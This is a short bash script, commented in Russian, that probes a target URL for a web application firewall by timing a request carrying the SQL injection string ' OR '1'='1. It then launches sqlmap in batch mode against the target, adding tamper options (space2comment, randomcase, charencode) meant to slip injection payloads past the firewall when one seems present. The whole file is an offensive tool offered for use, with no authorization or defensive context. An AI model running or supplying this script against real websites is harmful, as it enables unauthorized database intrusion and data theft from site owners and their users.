#!/bin/bash
TARGET=$1
# Проверяем WAF
N=$(curl -sk --max-time 5 "$TARGET" -o /dev/null -w '%{time_total}' 2>/dev/null)
S=$(curl -sk --max-time 5 "$TARGET?id=1' OR '1'='1" -o /dev/null -w '%{time_total}' 2>/dev/null)
DIFF=$(python3 -c "print(int(($S-$N)*1000))" 2>/dev/null)

if [ "${DIFF:-0}" -gt 100 ]; then
    sqlmap -u "$TARGET" --batch --tamper=space2comment,randomcase,charencode --level=3
else
    sqlmap -u "$TARGET" --batch --level=2
fi
